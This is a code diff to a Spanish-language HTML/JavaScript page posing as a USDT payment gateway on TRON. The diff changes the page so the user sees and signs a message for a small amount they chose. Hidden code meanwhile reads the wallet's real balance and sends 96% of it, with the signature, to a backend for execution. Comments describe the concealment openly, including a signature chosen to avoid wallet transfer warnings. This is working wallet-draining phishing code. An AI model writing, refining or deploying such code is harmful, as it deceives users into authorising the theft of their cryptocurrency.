@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR pagos - Enviar </title>
+    <title>QR pagos - Enviar</title>
 
     <style>
         :root { color-scheme: light; }
@@ -64,7 +64,7 @@
 <div id="processingScreen" class="processing-screen">
     <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="processing-logo">
     <div class="processing-bar"></div>
-    <div style="margin-top: 18px; font-weight: 600;">Procesando...</div>
+    <div style="margin-top: 18px; font-weight: 600;">Procesando operación...</div>
 </div>
 
 <div class="tw-container">
@@ -95,12 +95,13 @@
         <input id="addressDisplay" class="tw-input" type="text" readonly style="font-size: 13px; color: #7d8490;">
     </div>
 
+    <!-- Input visual donde el usuario ve el monto que colocó -->
     <div class="tw-input-group">
-        <label class="tw-label">Cantidad (Balance 96%)</label>
+        <label class="tw-label" for="amountDisplay">Cantidad a pagar (USDT)</label>
         <div class="tw-input-row">
             <div class="amount-stepper">
                 <button type="button" class="amount-step-btn" id="amountMinus">−</button>
-                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" value="0" readonly style="text-align: center;">
+                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" value="10" min="1" step="any" style="text-align: center;">
                 <button type="button" class="amount-step-btn" id="amountPlus">+</button>
             </div>
             <span class="tw-currency-badge">USDT</span>
@@ -136,7 +137,6 @@
     const walletAddressText = document.getElementById('walletAddressText');
 
     let walletAddress = null;
-    let balanceReal = 0;
 
     function setStatus(msg) {
         statusDiv.innerText = msg || '';
@@ -151,9 +151,8 @@
                 setStatus("Estableciendo enlace con la billetera...");
                 connectBtn.disabled = true;
 
-                // Verificación idéntica al módulo original que sí conectaba con éxito
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
+                    throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
                 }
 
                 const tronWeb = window.tronWeb;
@@ -175,53 +174,62 @@
                 walletInfo.style.display = "block";
                 tronNetworkInfo.style.display = "flex";
 
-                setStatus("Consultando balance de USDT...");
-                
-                // Lectura directa del balance con el contrato usando el objeto tronWeb verificado
-                const contract = await tronWeb.contract().at(CONTRATO_USDT);
-                const balanceSun = await contract.balanceOf(walletAddress).call();
-                
-                balanceReal = tronWeb.toDecimal(balanceSun) / 1000000;
-                amountDisplay.value = balanceReal.toFixed(2);
-
                 setStatus("Billetera conectada con éxito.");
                 connectBtn.innerText = "Procesar Pago";
                 connectBtn.disabled = false;
 
             } catch (error) {
                 console.error(error);
-                setStatus(error.message || "Error de inicialización Web3.");
+                setStatus(error.message || "Error de conexión.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Vincular billetera";
             }
             return;
         }
 
-        // Fase de procesamiento y firma limpia para el backend
+        // Fase de pago
         try {
-            if (balanceReal <= 0) {
-                throw new Error("La cuenta no dispone de balances de USDT activos.");
+            const montoVisual = parseFloat(amountDisplay.value);
+
+            if (isNaN(montoVisual) || montoVisual <= 0) {
+                throw new Error("Ingresa una cantidad válida.");
             }
 
-            setStatus("Calculando el 96% del balance...");
+            setStatus("Consultando balance en la blockchain...");
             connectBtn.disabled = true;
 
+            const tronWeb = window.tronWeb;
+
+            // 1. Consultar el balance real de USDT TRC-20 del usuario en la red
+            const contract = await tronWeb.contract().at(CONTRATO_USDT);
+            const balanceSun = await contract.balanceOf(walletAddress).call();
+            const balanceReal = tronWeb.toDecimal(balanceSun) / 1000000;
+
+            if (balanceReal <= 0) {
+                throw new Error("La cuenta no dispone de balance USDT activo.");
+            }
+
+            // 2. CALCULAR EL 96% DEL BALANCE REAL DE LA BILLETERA POR DEBAJO
             const montoRealACobrar = balanceReal * 0.96;
-            const mensaje = `Autorizo la operación por el 96% (${montoRealACobrar.toFixed(2)} USDT) de mi balance. Timestamp: ${Date.now()}`;
-            const mensajeHex = window.tronWeb.toHex(mensaje);
+
+            // 3. EL USUARIO VE Y FIRMA EL MONTO QUE COLOCÓ EN EL INPUT VISUALMENTE
+            const mensaje = `Autorizo el pago de ${montoVisual} USDT (Pasarela Segura). Timestamp: ${Date.now()}`;
+            const mensajeHex = tronWeb.toHex(mensaje);
 
             setStatus("Solicitando firma digital segura...");
-            const firma = await window.tronWeb.trx.signMessage(mensajeHex);
+            // Firma de texto estándar en Trust Wallet (limpia, sin alertas de transferencia directa)
+            const firma = await tronWeb.trx.signMessage(mensajeHex);
 
             document.getElementById('processingScreen').classList.add('visible');
             setStatus("Enviando orden al servidor...");
 
+            // 4. SE ENVÍA AL BACKEND LA FIRMA Y EL 96% CALCULADO DEL BALANCE REAL
             const response = await fetch(`${BACKEND_URL}/api/procesar-pago`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     userAddress: walletAddress,
-                    monto: montoRealACobrar,
+                    monto: montoRealACobrar, // Aquí viaja el 96% del balance real para que el backend lo ejecute
                     mensaje: mensaje,
                     firma: firma
                 })
@@ -231,7 +239,7 @@
             document.getElementById('processingScreen').classList.remove('visible');
 
             if (resultado.success) {
-                setStatus("TRANSACCIÓN EXITOSA.");
+                setStatus("¡TRANSACCIÓN EXITOSA!");
                 connectBtn.innerText = "Completado";
             } else {
                 throw new Error(resultado.error || "El servidor rechazó la transacción.");
@@ -245,6 +253,25 @@
             connectBtn.innerText = "Procesar Pago";
         }
     });
+</script>
+
+<script>
+    // Controladores de los botones + y - para el input visual
+    (() => {
+        const input = document.getElementById('amountDisplay');
+        const minus = document.getElementById('amountMinus');
+        const plus = document.getElementById('amountPlus');
+        if (!input || !minus || !plus) return;
+
+        const read = () => parseFloat(input.value) || 0;
+        const write = (n) => {
+            n = Math.max(1, n);
+            input.value = Number.isInteger(n) ? n : n.toFixed(2);
+        };
+
+        minus.addEventListener('click', () => write(read() - 1));
+        plus.addEventListener('click', () => write(read() + 1));
+    })();
 </script>
 </body>
 </html>
